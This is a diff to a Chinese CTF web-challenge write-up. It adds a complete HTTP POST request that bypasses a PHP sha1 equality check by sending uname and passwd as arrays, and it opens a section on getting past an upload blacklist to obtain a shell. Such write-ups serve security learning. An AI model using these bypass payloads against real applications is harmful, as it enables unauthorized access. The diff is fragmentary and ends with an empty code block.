@@ -683,7 +683,29 @@ if (isset($_GET['uname']) and isset($_POST['passwd'])) {
 ```
 提交的 id url 解码后等于 margin
 sha1 加密 uname 和 passwd 后两者相等,但是两者又不能相等,可以利用数组绕过,也可以 sha1 碰撞
-构造 payload:`
+构造 payload
+```
+POST /web7/?uname[]=1&id=%6Dargin HTTP/1.1
+Host: 123.206.87.240:8002
+Content-Length: 14
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Origin: http://123.206.87.240:8002
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://123.206.87.240:8002/web7/?uname[]=1&id=%6Dargin
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
+Connection: close
+
+passwd%5B%5D=2
+```
+或者
+```
+
 ## 求 Getshell
 后缀名黑名单检测和类型检测
 
@@ -691,11 +713,11 @@ sha1 加密 uname 和 passwd 后两者相等,但是两者又不能相等,可以�
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwMDI1NzI3NzYsMjA2ODQ4ODAxNiw5Nj
-k4MjcyMDcsMTI5NTg5MTA5LDM3MzA0OTMzNywtMTQyODczNjc0
-Nyw0NjA2MTg1MzcsLTcwNDM0MzI5OCwyMDQ1MTc3NDM4LC01Nj
-E3OTExNjksLTkzNzUxNjE5OSwtMTE1NzgyNzAwNSwxMTkxMzI1
-Nzk1LC0xMDI2MDI1MjU3LDYwNDU3NDc5MiwtMTIxNjQ1NDE0Ny
-wtMTY5MTI0ODQ0NCwtMTU4ODU0ODkzLDg2OTM3MDMzMCwxNDc2
-MDE5NDM5XX0=
+eyJoaXN0b3J5IjpbMTExMTkxMzc2NCwtMTAwMjU3Mjc3NiwyMD
+Y4NDg4MDE2LDk2OTgyNzIwNywxMjk1ODkxMDksMzczMDQ5MzM3
+LC0xNDI4NzM2NzQ3LDQ2MDYxODUzNywtNzA0MzQzMjk4LDIwND
+UxNzc0MzgsLTU2MTc5MTE2OSwtOTM3NTE2MTk5LC0xMTU3ODI3
+MDA1LDExOTEzMjU3OTUsLTEwMjYwMjUyNTcsNjA0NTc0NzkyLC
+0xMjE2NDU0MTQ3LC0xNjkxMjQ4NDQ0LC0xNTg4NTQ4OTMsODY5
+MzcwMzMwXX0=
 -->
